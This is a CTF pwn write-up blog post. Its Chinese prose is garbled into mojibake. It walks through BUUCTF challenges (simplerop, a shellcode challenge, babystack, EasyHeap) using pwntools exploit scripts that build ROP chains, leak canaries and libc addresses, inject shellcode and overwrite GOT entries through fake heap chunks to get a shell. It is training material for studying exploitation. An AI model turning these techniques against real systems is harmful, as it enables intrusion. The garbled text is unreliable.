<img src="/2021/05/09/2021-05-09-buu05/QQå›¾ç‰‡20210522155322.png" style="zoom:80%;">

<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27280</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x080485BD</span><br>flag=<span class="hljs-number">0x80487e0</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x17</span>+p32(system)+p32(flag)+p32(flag)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åå…­ã€cmcc-simplerop"><a href="#ä¸‰åå…­ã€cmcc-simplerop" class="headerlink" title="ä¸‰åå…­ã€cmcc_simplerop"></a>ä¸‰åå…­ã€cmcc_simplerop</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522172402.png"></p>
<p>checksecä¸€ä¸‹ï¼Œç„¶åæ‹–è¿›idaã€‚</p>
<img src="/2021/05/09/2021-05-09-buu05/QQå›¾ç‰‡20210522172444.png" style="zoom:80%;">

<p>ç¬¦å·è¡¨æ»¡æ»¡å½“å½“ï¼Œé™æ€é“¾æ¥äº†ã€‚ä¸€èˆ¬è€ƒè™‘ä¸ºret2syscallã€‚ä¹Ÿç¡®å®ï¼ŒROPgadgetå¯»æ‰¾äº†ä¸€ç•ªï¼Œsyscalléœ€è¦çš„éƒ½æœ‰äº†ã€‚é™¤äº†æ²¡æœ‰/bin/shï¼Œæœ€å¼€å§‹æˆ‘æ˜¯ç›´æ¥å¯»æ‰¾shå­—ç¬¦ä¸²çš„ï¼Œå› ä¸ºæœ‰çš„é¢˜ç›®shä¹Ÿæ˜¯å¯ä»¥getshellçš„ï¼Œä½†æ˜¯è¿™é¢˜ä¸è¡Œã€‚å°±å¿…é¡»è¦æ‰¾åœ°æ–¹è¾“å…¥/bin/shäº†ï¼Œè¿™ä¸ªåœ°æ–¹å½“ç„¶æ˜¯.bssæ®µå•¦</p>
<p>ç„¶åå°±æ˜¯è¿™è¾¹çš„æº¢å‡ºIDAé‡Œé¢æœ‰è¯¯ï¼Œéœ€è¦gdbé‡Œé¢è¿›è¡Œå¯»æ‰¾ï¼Œåç§»ä¸º32æ‰å¯¹ã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522162230.png"></p>
<p>exp1ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>int_80=<span class="hljs-number">0x0806EEF0</span><br>sh=<span class="hljs-number">0x080eafe1</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(pop_eax)+p32(<span class="hljs-number">0x3</span>)+p32(ppp_ret)+p32(<span class="hljs-number">8</span>)+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(int_80)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå†™æ³•ï¼Œæ˜¯æˆ‘è½¬åå†™çš„æ ·å­ï¼Œä½†æ˜¯æˆ‘çš„ä¸è¡Œï¼Œå‡ºç°ä¸‹é¢çš„æŠ¥é”™æ‰“ä¸é€šã€‚å»ç™¾åº¦äº†ï¼Œä½†æ˜¯ç”±äºåšå®¢å›­å®¡æ ¸ï¼Œæ²¡èƒ½æŸ¥çœ‹åˆ°åšæ–‡</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522172906.png"></p>
<p>è¿™è¾¹ä¼¼ä¹æ˜¯execveçš„æ¡ä»¶æœªè¾¾æˆï¼Œå¯æ˜¯æˆ‘ä¸ä¸Šé¢çš„expå·®åˆ«åªåœ¨äºint 80çš„åœ°å€ä¸åŒï¼Œæˆ‘çš„æ˜¯ROPgadgetä¸­æ‰¾åˆ°çš„ï¼Œè€Œä¸Šé¢expé‡Œé¢çš„int 80ï¼Œæ˜¯æˆ‘åœ¨ä¸€ä¸ªå¸ˆå‚…çš„wpé‡Œé¢å‘ç°çš„ï¼Œä¸¤è€…ä¸ä¸€æ ·</p>
<p>exp2ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>int_80=<span class="hljs-number">0x080493e1</span><br>sh=<span class="hljs-number">0x080c1a9d</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæ–¹æ³•å…¶å®æœ¬è´¨åŸç†ä¸ä¸Šä¸€ä¸ªä¸€æ ·ï¼Œå°±æ˜¯è·³è½¬readçš„æ„é€ æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿™è¾¹ç›´æ¥ä½¿ç”¨åœ°å€è·³è½¬ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿè°ƒç”¨ã€‚æ³¨æ„è¿™ä¸¤ä¸ªæ–¹æ³•çš„int 80ä¸ä¸€æ ·ï¼Œç”¨ç¬¬äºŒçš„int 80è°ƒç”¨ä¸¤æ¬¡å°±ä¼šå‡ºç°ä¸Šå›¾çš„æƒ…å†µ</p>
<p>exp3ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level =<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>bss=<span class="hljs-number">0x080eaf80</span><br>mprotect=elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(mprotect)+p32(ppp_ret)+p32(<span class="hljs-number">0x80ea000</span>)+p32(<span class="hljs-number">0x2000</span>)+p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x50</span>)+p32(bss)<br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ä¸ªæ–¹æ³•æ˜¯ä½¿ç”¨mprotectæŠŠ.bssä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼Œç„¶åæ³¨å…¥shellcodeæ¥getshellï¼Œæœ‰ä¸ªç‚¹æ˜¯ä¿®æ”¹çš„èµ·å§‹ä½ç½®ï¼Œå¾—è¦æœ€åä¸‰ä¸ªä¸º0æ‰è¡Œï¼Œå¦åˆ™æ‰“ä¸é€šï¼Œåƒæ˜¯å†…å­˜å¯¹é½çš„é—®é¢˜ã€‚</p>
<h3 id="ä¸‰åä¸ƒã€mrctf2020-shellcode"><a href="#ä¸‰åä¸ƒã€mrctf2020-shellcode" class="headerlink" title="ä¸‰åä¸ƒã€mrctf2020_shellcode"></a>ä¸‰åä¸ƒã€mrctf2020_shellcode</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522191716.png"></p>
<p>checksecä¸€ä¸‹ï¼Œé¢„æµ‹æ˜¯æ³¨å…¥shellcodeï¼Œç„¶åæ‹–è¿›IDAã€‚</p>
<img src="/2021/05/09/2021-05-09-buu05/QQå›¾ç‰‡20210522191817.png" style="zoom:80%;">

<p>è¿™é¢˜å‡ºæ²¡åŠæ³•åæ±‡ç¼–ï¼Œç™¾åº¦ä¸Šçš„wpä¹Ÿæ²¡åŠæ³•ï¼Œå¯èƒ½æ˜¯ç›´æ¥call raxæœ‰ç‚¹é—®é¢˜ã€‚ä¸è¿‡å¥½åœ¨æ±‡ç¼–ä¸å¤æ‚ï¼Œå¾ˆç®€å•çš„ç¨‹åºé€»è¾‘ï¼Œå…ˆè¾“å…¥0x400ï¼Œç„¶ååšä¸€ä¸ªåˆ¤æ–­ï¼Œå…¶å®è¿™ä¸ªåˆ¤æ–­æ— å½±å“çš„ï¼Œæœ‰è¾“å…¥çš„è¯ï¼Œraxè¿”å›å€¼å°±æ˜¯å¤§äº0ï¼Œè·³è½¬åˆ°å³ä¾§å»æ‰§è¡Œï¼Œå³ä¾§æ˜¯ç›´æ¥æ‰§è¡Œæˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™è¾¹æ˜¯ç›´æ¥ret2shellcode</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27104</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;magic!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åå…«ã€others-babystack"><a href="#ä¸‰åå…«ã€others-babystack" class="headerlink" title="ä¸‰åå…«ã€others_babystack"></a>ä¸‰åå…«ã€others_babystack</h3><p>è¿™é¢˜ä»£ç å¾ˆç®€å•ï¼Œcanaryä¹Ÿå¾ˆå®¹æ˜“æ³„éœ²ï¼Œå…¶ä»–å°±æ˜¯ropã€‚æ‰€ä»¥ä¸å¤šè¯´ã€‚</p>
<p>æ³¨æ„ç‚¹å°±æ˜¯ï¼Œè¿™é‡Œçš„é€€æ ˆè¦æ‰§è¡ŒåŠŸèƒ½3æ‰èƒ½é€€å‡ºï¼Œæˆ‘åˆšå¼€å§‹ä¸€ç›´ååº”è¿‡æ¥ï¼Œåé¢æ‰å‘ç°çš„ã€‚</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27939</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=<span class="hljs-number">0x400908</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400a93</span><br><span class="hljs-comment">#æ³„æ¼canary</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>)<br>canary=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;canary: &quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>puts=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åä¹ã€-ZJCTF-2019-EasyHeap"><a href="#ä¸‰åä¹ã€-ZJCTF-2019-EasyHeap" class="headerlink" title="ä¸‰åä¹ã€[ZJCTF 2019]EasyHeap"></a>ä¸‰åä¹ã€[ZJCTF 2019]EasyHeap</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525230925.png"></p>
<p>checksecä¸€ä¸‹ï¼Œ ç„¶åè¿›å…¥idaã€‚æ ¹æ®é¢˜ç›®å·²ç»çŸ¥é“æ˜¯ä¸ªheapé¢˜ç›®ã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231121.png"></p>
<p>è¿™è¾¹åœ¨ç¼–è¾‘chunkä¸Šå†…å®¹æ—¶å€™ï¼Œè¾“å…¥çš„å¤§å°æ˜¯å†æ¬¡ç”±æˆ‘ä»¬ç¡®å®šçš„ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ç€å †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥ä¿®æ”¹åä¸€ä¸ªchunkçš„fdæŒ‡é’ˆï¼Œå¯¼è‡´ä»»æ„å†™çš„ç›®çš„ã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231025.png"></p>
<p>è¿™è¾¹é‡Šæ”¾å·²ç»æŠŠæŒ‡é’ˆç½®ç©ºäº†ã€‚</p>
<p>ç”Ÿæˆchunkå°±æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç„¶åè¿™é‡Œæ˜¯æ²¡æœ‰æ‰“å°å‡½æ•°çš„ï¼Œå¦‚æœè¦è¾“å‡ºå°±æ¯”è¾ƒéº»çƒ¦ï¼Œè¦ç”¨IOç»“æ„ä½“è¾“å‡ºäº†ã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231313.png"></p>
<p>è¿™è¾¹å…¶å®æœ‰ä¸ªåé—¨å‡½æ•°çš„ï¼Œå¯èƒ½æ˜¯åŸé¢˜çš„æœ‰ï¼Œä½†æ˜¯è¿™æ˜¯buuï¼Œåšåˆ°è¿™å¤§å®¶åº”è¯¥éƒ½çŸ¥é“ï¼Œflagå°±æ˜¯ç›´æ¥åœ¨/æ ¹ç›®å½•ä¸‹çš„ï¼Œæ‰€ä»¥ä¸ç”¨å»å°è¯•å°±çŸ¥é“è¿™é‡Œä¸è¡Œï¼Œä½†æ˜¯ç»™äº†systemå‡½æ•°ï¼Œgotåˆå¯ä»¥æ”¹å†™ï¼Œè¿™è¾¹å°±ä½¿ç”¨ä¿®æ”¹gotè¡¨çš„æ–¹æ³•ã€‚å…·ä½“è„šæœ¬å†™ï¼Œexpçš„æ³¨é‡Šååˆ†è¯¦ç»†äº†ï¼Œæ­¥éª¤ä¹Ÿä¸å¤æ‚ï¼Œå°±ä¸èµ˜è¿°äº†ã€‚</p>
<p>å…·ä½“è„šæœ¬ç¼–å†™ï¼Œæˆ‘åœ¨ç™¾åº¦é‡Œé¢æ‰¾åˆ°äº†ä¸€ä¸ªå¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†ï¼Œå°±ç›´æ¥æ¬è¿‡æ¥äº†</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26437</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020e0</span>-<span class="hljs-number">0x40</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br><span class="hljs-comment"># ä¿®æ”¹ heap1 å†…å®¹ä¸º &#x27;/bin/sh\x00&#x27;, ä»¥åŠå †æº¢å‡º heap2(freed) ä¿®æ”¹å…¶ fd æŒ‡é’ˆ </span><br><span class="hljs-comment"># å› ä¸ºæœ€åé‡Šæ”¾çš„æ˜¯ heap1,åˆ©ç”¨ &#x27;__free_hook&#x27;(system) Getshell </span><br><span class="hljs-comment"># ä¸ºä»€ä¹ˆæ˜¯ 0x6020e0-0x40+0xdï¼Œè¿™ä¸ªåç§»å°±æ˜¯å»å¯»æ‰¾7fçš„å›ºå®šæ‰‹æ³•ï¼Œåªæ˜¯æ”¹å˜-åé¢çš„å»æ‰¾ç¬¦åˆæ¡ä»¶çš„å°±æ˜¯äº†</span><br><span class="hljs-comment"># FakeChunk è‹¥ä»¥è¿™é‡Œä¸º prev_sizeï¼Œåˆ™ size æ­£å¥½æ˜¯ä¸€ä¸ª 0x000000000000007f</span><br><span class="hljs-comment"># å¯ä»¥ç»•è¿‡ malloc_chunk çš„åˆæ³•æ€§éªŒè¯ (new_chunk çš„ size ä½è¦ä¸ bin é“¾è¡¨ size ä¸€è‡´)</span><br><span class="hljs-comment"># è¿™æ ·å°±ä¼ªé€ å‡ºäº†ä¸€ä¸ª chunk</span><br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(free_got)<br>edit(<span class="hljs-number">3</span>,payload)<br><span class="hljs-comment"># ä¿®æ”¹ heap3 (Fake)</span><br><span class="hljs-comment"># ä½œç”¨æ˜¯æŠŠ heaparray[0] çš„åœ°å€ (åŸå…ˆè®°å½•çš„æ˜¯ chunk0çš„åœ°å€) è¦†å†™æˆ free_got åœ°å€</span><br><span class="hljs-comment"># è¿™å°±æ˜¯è¦åœ¨ heaparry é™„è¿‘æ„é€  Fakeheap çš„åŸå› </span><br><span class="hljs-comment"># ç¡®å®šå…·ä½“çš„åç§»é‡éœ€è¦åŠ¨æ€è°ƒè¯• </span><br>edit(<span class="hljs-number">0</span>,p64(system))<br><span class="hljs-comment"># free_got åœ°å€çš„ä½œç”¨åœ¨è¿™é‡Œä½“ç°äº†</span><br><span class="hljs-comment"># ç”±äº edit() çš„ç›®æ ‡æ˜¯ heaparry[] é‡Œé¢çš„åœ°å€</span><br><span class="hljs-comment"># é‚£ä¹ˆæœ¬æ¬¡æ“ä½œå°†ä¿®æ”¹ free_got ä¸º system_plt çš„åœ°å€</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># å½“é‡Šæ”¾ chunk1 (å†…å®¹ä¸º &#x27;/bin/sh\0x00&#x27;) çš„æ—¶å€™</span><br><span class="hljs-comment"># æŠŠ chunk1 å½“å‚æ•°ä¼ å…¥ free() ä¸­æ‰§è¡Œï¼Œç”±äº free() åœ°å€å·²ç»è¢«ä¿®æ”¹æˆ system()</span><br><span class="hljs-comment"># æœ€åç¨‹åºæ‰§è¡Œçš„å°±æ˜¯ system(chunk1&#x27;s content) å³ system(&#x27;/bin/sh\0x00&#x27;), æˆåŠŸ Getshell</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæˆ‘è‡ªå·±å†™çš„æ²¡èƒ½æ‰“é€šï¼Œçœ‹æŠ¥é”™åƒæ˜¯æ£€éªŒå¤§å°æ²¡è¿‡ï¼Œå¯æ˜¯æˆ‘ä¹‹å‰åšè¿‡ä¸€é“é¢˜ï¼Œè¿™æ ·å­ä¹Ÿæ˜¯å¯ä»¥åˆ›å»ºå †å—çš„ï¼Œæˆ‘æ˜¯æƒ³æŠŠchunkç›´æ¥åˆ›å»ºåœ¨freeçš„got.plté‡Œé¢ï¼Œç›´æ¥æ”¹å°±å¥½äº†ï¼Œæ²¡å¿…è¦åƒä¸Šé¢ç»•ä¸€åœˆå­ï¼Œæ²¡æƒ³è¿‡ä¸è¡Œã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210527152159.png"></p>
<p>exp2ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,28313)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=<span class="hljs-number">0x602018</span><br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(free_got-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

